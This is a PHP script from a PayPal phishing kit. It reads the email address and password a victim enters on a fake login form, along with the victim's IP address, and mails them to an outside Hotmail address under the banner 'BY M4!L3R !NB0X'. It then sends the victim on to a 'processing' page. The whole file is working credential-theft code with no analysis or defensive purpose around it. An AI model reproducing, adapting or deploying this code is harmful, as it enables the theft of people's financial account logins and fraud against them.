<?php include "encriptar.php";?>
<?php

$hostname = bin2hex ($_SERVER['HTTP_HOST']);

$_SESSION['EMAIL'] = $Email = $_POST['eml'];
$_SESSION['PASSWORD'] = $Pass = $_POST['passwd'];


function is_email($input) {
  $email_pattern = "/^([a-zA-Z0-9\-\_\.]{1,})+@+([a-zA-Z0-9\-\_\.]{1,})+\.+([a-z]{2,4})$/i";
  if(preg_match($email_pattern, $input)) return TRUE;
 
} 

if(!is_email($Email)) {
$errors3=1;
}
else
{
$errors3=0;
}





if ($Pass=="") {
$errors2=1;
}
else{
$errors2=0;
}

if (strlen($Pass)<5)
{
$errors2=1;
}
else{
$errors2=0;
}

if ($errors2==1 || $errors3==1)
{

header("Location: index.php?webscr=$errors2&$errors3&header=$hostname").md5(time());
}
else
{
{
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

$message .= "=========[BY M4!L3R !NB0X]=========\n";
$message .= "PayPal Email  : ".$_POST['eml']."\n";
$message .= "PayPal Password  : ".$_POST['passwd']."\n";
$message .= "===============[IP]==============\n";
$message .= "IP	: http://www.geoiptool.com/?IP=$ip\n";
$message .= "==========[BY M4!L3R !NB0X]=========\n";


include 'MonEmail.php';
$subject = "PP LOGIN FROM [$ip]";
$to="the-pay-pal@hotmail.com";
mail($to, $subject, $message);
}

header("Location:proccessing.php");
}

?>